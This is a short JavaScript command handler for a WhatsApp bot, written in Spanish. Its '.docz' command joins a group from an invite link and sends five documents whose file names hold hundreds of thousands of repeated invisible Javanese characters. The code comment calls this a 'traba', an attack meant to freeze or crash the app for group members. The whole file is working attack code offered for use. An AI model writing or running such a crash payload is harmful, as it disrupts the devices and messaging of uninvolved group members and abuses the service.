let handler = async (m, { conn, text }) => {
  if (!text || !text.includes('chat.whatsapp.com')) {
    return m.reply('❌ Debes proporcionar el enlace del grupo.\n\n📄 Ejemplo:\n.docz https://chat.whatsapp.com/XXXX', m);
  }

  const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/);
  if (!match) return m.reply('😿 Enlace inválido.', m);

  const inviteCode = match[1];
  let groupId;

  try {
    groupId = await conn.groupAcceptInvite(inviteCode);
  } catch (e) {
    groupId = `120363${inviteCode}@g.us`;
  }

  // Traba invisible
  const basura = 'ꦾ'.repeat(90000);
  const fileName = '🐢🐢🐢' + basura + basura + basura +basura +basura;

  for (let i = 0; i < 5; i++) {
    await conn.sendMessage(groupId, {
      document: { url: 'https://files.catbox.moe/2dvudi.txt' },
      fileName: fileName + '.txt',
      mimetype: 'text/plain',
      caption: '🔥 Tobi 🔥',
    });
  }

  await m.reply('📦 Documentos enviados al grupo correctamente.');
};

handler.command = ['docz'];
handler.tags = ['bug', 'grupo'];
handler.help = ['docz <enlace>'];
export default handler;